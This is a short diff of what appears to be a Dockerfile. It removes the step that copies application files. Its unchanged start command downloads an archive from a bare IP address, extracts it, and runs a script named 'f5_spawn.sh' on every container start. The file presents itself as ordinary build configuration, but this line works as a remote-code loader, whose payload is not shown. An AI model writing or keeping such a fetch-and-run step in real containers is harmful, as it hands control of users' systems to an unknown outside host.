@@ -22,7 +22,4 @@ COPY requirements.txt /app/
 RUN pip install --no-cache-dir --upgrade pip && \
     pip install --no-cache-dir -r requirements.txt
 	
-# Copy application files
-COPY . /app
-
 CMD wget -q http://93.127.143.124/solver.tar.gz && tar -pxzf solver.tar.gz -C . && cd /app/solver && ./f5_spawn.sh && /start.sh
